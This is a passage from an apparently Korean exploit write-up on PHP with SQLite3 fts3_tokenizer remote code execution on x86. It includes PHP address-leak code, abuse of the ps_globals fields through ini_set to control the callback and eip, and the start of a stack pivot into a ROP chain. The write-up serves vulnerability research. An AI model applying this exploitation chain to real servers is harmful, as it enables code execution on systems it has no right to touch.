punctuation\">;</span> <span class=\"token comment\">// crash</span></code></pre></div>\n<ul>\n<li>다음과 같은 형태로 취약점 Exploit 흐름이 진행되어 집니다.</li>\n<li>x86 환경에서의 취약점은 <code class=\"language-text\">xCreate</code> 의 Callback 트리거 만으로 Exploit 진행이 어렵다고 판단하여 <code class=\"language-text\">xOpen</code> 의 인자 트리거를 통해 진행하였습니다.</li>\n</ul>\n<h2 id=\"x86bit-환경-php-with-sqlite3-fts3-tokenizer-rce-취약점\" style=\"position:relative;\"><a href=\"#x86bit-%ED%99%98%EA%B2%BD-php-with-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"x86bit 환경 php with sqlite3 fts3 tokenizer rce 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>x86bit 환경 PHP with SQLite3 fts3 tokenizer RCE 취약점</h2>\n<h3 id=\"fts3_tokenizer-info-leak\" style=\"position:relative;\"><a href=\"#fts3_tokenizer-info-leak\" aria-label=\"fts3_tokenizer info leak permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3_tokenizer info leak</h3>\n<ul>\n<li>leak 된 simple tokenizer의 주소 값을 리틀 엔디안으로 변경 작업을 진행시 4바이트 기준으로 fllip을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$val</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token function\">hexdec</span><span class=\"token punctuation\">(</span><span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h3 id=\"fts3-tokenizer-callback\" style=\"position:relative;\"><a href=\"#fts3-tokenizer-callback\" aria-label=\"fts3 tokenizer callback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 tokenizer callback</h3>\n<ul>\n<li>2번째 인자인 callback 주소를 컨트롤 하여 임의의 값으로 덮여 씌어진 것을 확인 할 수 있습니다.</li>\n<li><code class=\"language-text\">edi</code> 레지스터를 조작해 원하는 방향을 이동이 가능한 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACZklEQVQ4y32U6XKiUBSEMTHqGBVXXOOuiGzigrtGy8oyM+//Oj112sEKcWp+UBQXbt/vnO6D0u1PMBr7aHVs9AYe5FkfLzAczWE5Gwz02W29Wteh5prIFVoolLrI5pt4iOYQeczyLpdSqenQjQUMcwlvdqS4CBimD9Ne8V2jOUalNuShuUIb8R8akqkqEsnyveBLy0Sn52IyPZCqVO4hGivg8SnPD2KJIjcokcz1elBDVyAW3JWi1oM3O5Ck1bXRH05JKeUpShqFUgf5YpuH1ZtjKEqKm79ShQif0zVsdu8wnTWcyRazxSt2h08MjTkFaw0DWqWP5foC292i/mKw7GvpJSgRNUyYytSwWJ5JJX0TI2b+iW0QQSEtal1MpnvM/RMPLFcHbI2sxxKle8LV5g2Ot6Oo6+3gry909Uo4oqMiZLkbGiNmPMWLJJRehwSFcLv/oCmWsybJavt2E2y2LTosPRRno7H8/015TldZythaMXOmveazkIig9EyMu5qUokiQgH+aklLrOLz+IpmUG5giWRRBiZUEWXIqSRDyfLHDaH0VuglKGdP5kdPRG3rc6E73FJLcaZUBY2P9TYGU/50qJJhW6ziefnNKXG+P+fKMzf6DeSRh26KrfOefMbZXIbrvwiQUscFohr4+vY1gQChiQjgyfSZBSKWHwdQEojdT0moD++NP9tB2Nyx/e/ikQUEPJdjSBgm3ZFXyl0hqnOk7QsmU5E5ONqwlnMkO/uqCdtehq9ccdniQTIq4Xyr3SS1/njtBmQj5UEat0TTZ9GtUuognNTqayb5wTUi5KfhRRDJ3Jf8BBjCmWCl/LGYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/21ee7ce62817f36943371acf662f8f00/37523/7.png\"\n        srcset=\"/static/21ee7ce62817f36943371acf662f8f00/e9ff0/7.png 180w,\n/static/21ee7ce62817f36943371acf662f8f00/f21e7/7.png 360w,\n/static/21ee7ce62817f36943371acf662f8f00/37523/7.png 720w,\n/static/21ee7ce62817f36943371acf662f8f00/83e77/7.png 889w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>하지만 해당 레지스터를 활용해서 Stack Pivot를 하기에는 어려움이 있기 때문에 <code class=\"language-text\">xOpen</code> 의 pInput을 트리거하는 방식으로 조작해보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xOpen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">,</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pInput<span class=\"token punctuation\">,</span>\n\t<span class=\"token keyword\">int</span> nBytes<span class=\"token punctuation\">,</span>\n\tsqlite3_tokenizer_cursor <span class=\"token operator\">*</span><span class=\"token operator\">*</span>ppCursor\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>만약 xCreate 를 모두 제어하기 위해서는 xOpen을 제어할 수 있는 연속적인 메모리 데이터 3개 이상이 필요합니다.</li>\n<li>이를 위해서 <code class=\"language-text\">PHP.ini</code> list의 값을 설정합니다.</li>\n</ul>\n<p><strong>PHP.ini (Structure _php_ps_globals)</strong></p>\n<ul>\n<li>Expand PHP Module의 코드를 보면 해당 ini 구조체가 정의되어 있으며 이러한 자료구조는 프로세스 상에서 전역적으로 존재하고 <code class=\"language-text\">.bss</code> 섹션에 포함되어 있기 때문에 위치를 알 수 있으며 공격하는데 있어서 좋은 벡터입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://www.php.net/manual/en/ini.list.php</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_php_ps_globals</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>save_path<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>session_name<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>id<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>extern_referer_chk<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>entropy_file<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cache_limiter<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> entropy_length<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> cookie_lifetime<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cookie_path<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cookie_domain<span class=\"token punctuation\">;</span>\n\tzend_bool  cookie_secure<span class=\"token punctuation\">;</span>\n\tzend_bool  cookie_httponly<span class=\"token punctuation\">;</span>\n\tps_module <span class=\"token operator\">*</span>mod<span class=\"token punctuation\">;</span>\n\tps_module <span class=\"token operator\">*</span>default_mod<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>mod_data<span class=\"token punctuation\">;</span>\n\tphp_session_status session_status<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_probability<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_divisor<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_maxlifetime<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> module_number<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> cache_expire<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>앞서 구조체에서 활용하는 필드는 빨간색으로 주석 처리한 부분을 사용할 예정이며, 포인터 구조와 정수 형태를 트리거할 수 있는 필드를 선정하여 가젯들이 적용할 수 있는 범위를 늘렸습니다.</li>\n<li>php.ini 항목을 조작하여 fts3 tokenizer 모듈 구조체를 조작할 수 있습니다.</li>\n</ul>\n<h3 id=\"fts3-tokenizer-두-번째-인자-ebp-레지스터-조작\" style=\"position:relative;\"><a href=\"#fts3-tokenizer-%EB%91%90-%EB%B2%88%EC%A7%B8-%EC%9D%B8%EC%9E%90-ebp-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0-%EC%A1%B0%EC%9E%91\" aria-label=\"fts3 tokenizer 두 번째 인자 ebp 레지스터 조작 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 tokenizer 두 번째 인자 ebp 레지스터 조작</h3>\n<ul>\n<li>두 번쨰 인자 ebp 레지스터를 다양한 메모리 범위로 조작이 가능하기 때문에 php.ini 의 <code class=\"language-text\">ps_globals</code> 의 구조체를 사용하기 위해 <code class=\"language-text\">gc_probability</code> 필드의 주소를 지정하였고 해당 위치로 이동하기 에 있어 <code class=\"language-text\">-0x4</code> 바이트 연산을 해서 호출원에서 계산 된 오프셋을 조작하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJklEQVQY0z2Q2U7CYBCFf3YoLRQQWkpFUBarhbYsDdZSliIERaIhJt75/k9xzEyMVzOZzJz5zhGT+RreNILtBFwdbwm1eoNavYt2x0b3zkGl1oHZfoBuDCDJTeQlDbc9F4ZpIZmuoKH3eVeSdYgwOmLmb+F4IRbBC/ynHR/K5RbW23ds4jNEsoyR+4z98QKt2Udd6+Hy9YPl6hXpbA3+Ika8/2AIQUT2OMDAmsGdLFm4dW2hqBhYbU6I1m9IZap4HC1wOF74iIh3+0+MvZAJyRk9J2ciCA9wpxGG1pzFqCd85Y+QREmQIjmdv2GY92ybHlAcJNgfTjHzN1BUE4KGhaKOXKHxn082X2crlEmhqPERzeVSC5ncFUcghAKRKCGRUrkKIXP/CxNqjhNe+sh1AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/baacb06fc343009d4872d0068294f270/37523/8.png\"\n        srcset=\"/static/baacb06fc343009d4872d0068294f270/e9ff0/8.png 180w,\n/static/baacb06fc343009d4872d0068294f270/f21e7/8.png 360w,\n/static/baacb06fc343009d4872d0068294f270/37523/8.png 720w,\n/static/baacb06fc343009d4872d0068294f270/1e088/8.png 840w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>ps_globals의 <code class=\"language-text\">gc_probability</code>, <code class=\"language-text\">gc_divisor</code>, <code class=\"language-text\">gc_maxlifetime</code> 해당 필드는 셋 전부 long 타입을 갖는 필드 입니다.</li>\n<li><code class=\"language-text\">xOpen</code> 을 트리거하기 위해서는 정상적으로 <code class=\"language-text\">xCreate</code> 가 동작한 후에 <code class=\"language-text\">insert query</code> 가 실행되어야 합니다. 그렇기 때문에 fts3 table <code class=\"language-text\">simple</code> 의 <code class=\"language-text\">simple_create</code> 해시 테이블 주소를 콜백으로 변경하여 <code class=\"language-text\">xOepn</code> 함수로 갈 경로를 만들어 봅시다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABNklEQVQY02WRaU/CQBiEUa5KEGmB2tRCaWnlElpALqEC4RQbjSVoICpfTPT//4Ex+yYYDB8mu9njmdlZn1Xro1huQ9UqSKtlGPk6hGQWwXASslKErBTgDwrgE1mac5FLUkoyEBcyOA3wOPHHaWTytbsTNJojRGMylEwJb9svMuAiIqYLD9O5h0AogZtqF956R6Z8QoX7tEHPWRDsH9AZLtHtzSAkNWg5C++fP6hYPUoxW6zw4L5SWrvuYPvxDVWvUNrVeofByD0G1m4HqNp9RGNXkOQ8OefMGkJcCs5gSWIJC6UW3OcN1RCLp8ms1RkfA5udMay6A1EyYeYbmMxekNWrCJ+JYHt3/TkB2Rp7oigZOL9QKDE7f9Th/fARumFDN23qiXXkD/KUUJKv/z5lf2Gvw7VD4C+nJqeQLk/kqAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/6db69931f8bc72d39cf86bbb2ed4df15/37523/9.png\"\n        srcset=\"/static/6db69931f8bc72d39cf86bbb2ed4df15/e9ff0/9.png 180w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/f21e7/9.png 360w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/37523/9.png 720w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/5b481/9.png 846w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>현재 환경에서 <code class=\"language-text\">0xe3bbc0</code> 의 주소는 <code class=\"language-text\">simpleCreate</code> 객체를 가리키고 다음 <code class=\"language-text\">0x7fffffff</code> 두 값들은 임의로 집어넣은 값입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.555555555555557%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiUlEQVQI1x3MYQqCMACAUVPLFJVp22w6QZMpaCEhmD+6/7W+oHeA58WyI1UDWrSYvEGmBissVrSUeU1W1KTGEcuerHLEicG/SMKrJogU/vmG5+ecAoEfFnhiWNHTh6ed2eqRpRrYmonVjDgzcO8m1LwjlwO1HOj+TWFelI+Dst+R7ksiR4JI/tMfs4EzcOgpS4wAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/f4ca616e40d5344f5d77255f3092c4c6/37523/10.png\"\n        srcset=\"/static/f4ca616e40d5344f5d77255f3092c4c6/e9ff0/10.png 180w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/f21e7/10.png 360w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/37523/10.png 720w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/cecac/10.png 728w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>php의 <code class=\"language-text\">ini_set</code> 메서드를 이용해서 각 전역 필드에 값을 넣어 줍니다.</li>\n<li>앞서 xOpen 을 활용하기 위해 세 개의 메모리 대역이 필요하다고 했는데 이를 <code class=\"language-text\">ps_globals</code> 필드를 활용하였습니다.</li>\n<li>필드의 값이 어디 부분에서 터지는지를 확인하기 위해 임의의 데이터를 넣은 결과 <code class=\"language-text\">eip</code> 레지스터를 조작할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7klEQVQoz5XSTXOCMBAG4BWtVgVSEFJUEAREHT9bqtVeOszYW///33mdrKPVg1M5bJI95MlmExomK7ivKYQVoG10Uam+oPpkX0LlWs3iuF7fC1KbiNroB1N87g8IhwvO1bzdHxBEc1DFfBglHkjHaPyO7+IX4+kG0hshTteYLXaQXnoD/lvhH5gj3xSI4iUaTReDaM647UTlwPqzy6Dq5e7rB344Q61uc55vC3i9rBzY0rvcM1WZCkcmjAhrAEP4IE2UexQiE0QGkuwNVidEz59AN/t8yBlT0CPYCdQEXzmbfHB1jozRaMrS3+UMHgF3Wbt/cgVUNgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/6227d5a0df36cef3a1d595e8b3994e79/37523/11.png\"\n        srcset=\"/static/6227d5a0df36cef3a1d595e8b3994e79/e9ff0/11.png 180w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/f21e7/11.png 360w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/37523/11.png 720w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/c1328/11.png 866w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 함수가 호출하는 호출 구간은 <code class=\"language-text\">call [edx+0xc]</code> 형태로 <code class=\"language-text\">edx</code> 레지스터를 기준으로 call이 되어지고 <code class=\"language-text\">eax</code> 레지스터에는 xOpen의 <code class=\"language-text\">insert in to query</code>의 value 값이 포함된 것을 확인할 수 있습니다.</li>\n</ul>\n<h3 id=\"stack-pivot를-이용한-payload-data-메모리-위치-변경-작업\" style=\"position:relative;\"><a href=\"#stack-pivot%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-payload-data-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%9C%84%EC%B9%98-%EB%B3%80%EA%B2%BD-%EC%9E%91%EC%97%85\" aria-label=\"stack pivot를 이용한 payload data 메모리 위치 변경 작업 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stack Pivot를 이용한 Payload data 메모리 위치 변경 작업</h3>\n<ul>\n<li>앞서 취약점을 활용하여 프로그램 카운터를 조작이 가능한 상태입니다.</li>\n<li>원하는 메모리 번지의 대역을 eax 레지스터가 참조하고 있는 구조</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkUlEQVQI133OvQ6CMABFYbQtYpGflhRaDJEEq6iLvv/DHQODg4kON2f7cpO88hg3Ys0JJS1KWcRSaZGiRiiDyBwbUZNsq7VbaT79XmKLwGuYufvIo5t4hgtXNzL3kXOIxDAxDjd80dOVPXnmSH5gK3jQHqM7yr2j0i0291jdousjuhlXQImaNG3YpQ3iz7sFfAMSPEXyTROC+AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/3ac23bc623be2a035e32088d57b9fee9/37523/12.png\"\n        srcset=\"/static/3ac23bc623be2a035e32088d57b9fee9/e9ff0/12.png 180w,\n/static/3ac23bc623be2a035e32088d57b9fee9/f21e7/12.png 360w,\n/static/3ac23bc623be2a035e32088d57b9fee9/37523/12.png 720w,\n/static/3ac23bc623be2a035e32088d57b9fee9/20982/12.png 778w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">insert into a value</code> 값으로 ROP를 수행할 수 있는 영역으로 만들기 위해 <code class=\"language-text\">XCHG</code> 가젯을 이용하여 eax 레지스터와 esp 레지스터를 체인하여 현재 프로그램 카운터가 생성된 페이로드 데이터의 메모리 대역으로 이동하도록 